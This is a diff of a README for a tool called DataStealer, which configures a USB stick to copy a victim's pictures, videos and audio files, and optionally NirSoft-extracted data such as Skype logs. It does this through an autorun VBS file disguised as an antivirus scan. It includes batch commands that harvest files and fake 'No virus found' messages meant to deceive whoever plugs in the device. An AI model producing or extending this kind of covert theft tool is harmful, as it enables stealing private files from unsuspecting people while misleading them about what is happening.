@@ -14,44 +14,34 @@ Just copy all from DataStealer folder and paste in USB device. Hide **"data"** f
 >Open=AntivirusUSB.vbs
 
 ## Configuration
+You can change diferents values in **run.bat**.
 
-### Folders
-If you want you can add more lines with folders in **"run.bat"** for gather information.
+**Add or remove formats of steal files**
+>set formats=*.jpg *.png *.mp4 *.3gp *.wav
+
+**Enable or disable messages**
+>set msg1=**true / false** [DEFAULT TRUE]
+>
+>set msg2=**true / false** [DEFAULT TRUE]
+>
+>set msg1text=Analyzing USB device for searching virus. [WINDOWS TEXT]
+>
+>set msg2text=No virus found. [WINDOWS TEXT]
+
+**Enable or disable file theft**
+>set stealfiles=**true / false** [DEFAULT TRUE]
+>
+>set nirsoft=**true / false** [DEFAULT TRUE]
+>
+>set soft=**[names of nirsoft software files]** [DEFAULT EMPTY]
+
+### Folders (Advanced Users)
+If you want you can add lines with more folders in **"run.bat"** for gather information.
 
 Like this:
->REM ############ Formats ############
->
->FOR /R **"%userprofile%\Pictures\"** %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
->
->REM #################################
+>FOR /R **"%userprofile%\Pictures\"** %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
 
-Replace **"%userprofile%\Pictures\"** for any folder.
-
-### Formats
-If you want you can add more formats in **"run.bat"** of files to gather
-
-Like this:
->REM ############ Formats ############
->
->set rest= \*.jpg,\*.png,\*.mp4,\*.3gp,\*.wav,**\*.avi**
->
->REM #################################
-
-### More funcionalities (Nirsoft)
-NirSoft web site provides a unique collection of small and useful freeware utilities, all of them developed by Nir Sofer. 
-
-For more funcionalities, go to [nirsoft.net](www.nirsoft.net "Nirsoft"), download software and put in "data/soft/" folder.
-
-Later add a line for each software in **"run.bat"**.
-
-Like this:
->REM ############ Nirsoft ############
->
->start data/soft/**SkypeLogView**.exe /shtml "data\pss\%USERNAME%\\**SkypeLogView**.html"
->
->REM #################################
-
-Replace **SkypeLogView** in both places with the software name.
+Replace **"%userprofile%\Pictures\"** for any folder from Windows.
 
 # Download
 [Releases](https://github.com/Kevinsillo/datastealer/releases)
